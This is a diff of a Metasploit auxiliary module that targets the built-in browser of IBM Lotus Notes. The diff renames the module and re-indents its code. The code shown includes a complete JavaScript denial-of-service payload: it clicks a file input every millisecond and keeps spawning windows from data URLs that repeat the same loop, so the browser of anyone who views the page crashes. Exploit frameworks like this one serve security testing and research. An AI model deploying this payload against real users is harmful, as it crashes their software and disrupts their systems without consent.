@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => "IBM Notes encodeURI DOS",
+        'Name'           => "IBM Notes Denial Of Service",
         'Description'    => %q(
           This module exploits a vulnerability in the native browser that comes with IBM Lotus Notes.
           If successful, the browser will crash after viewing the webpage.
@@ -46,17 +46,17 @@ var i = 1;
 f.click();
 setInterval("f.click()", 1);
 setInterval(function(){
-	for (var k in kins) {
-		if (kins[k] && kins[k].status === undefined) {
-			kins[k].close();
-			delete kins[k];
-		}
-	}
-	w = open('data:text/html,<input type=file id=f><script>f.click();setInterval("f.click()", 1);<\/script>');
-	if (w) {
-		kins[i] = w;
-		i++;
-	}
+          for (var k in kins) {
+          if (kins[k] && kins[k].status === undefined) {
+          kins[k].close();
+          delete kins[k];
+           }
+         }
+        w = open('data:text/html,<input type=file id=f><script>f.click();setInterval("f.click()", 1);<\/script>');
+        if (w) {
+                kins[i] = w;
+                i++;
+        }
 }, 1);
 </script>
 </body></html>
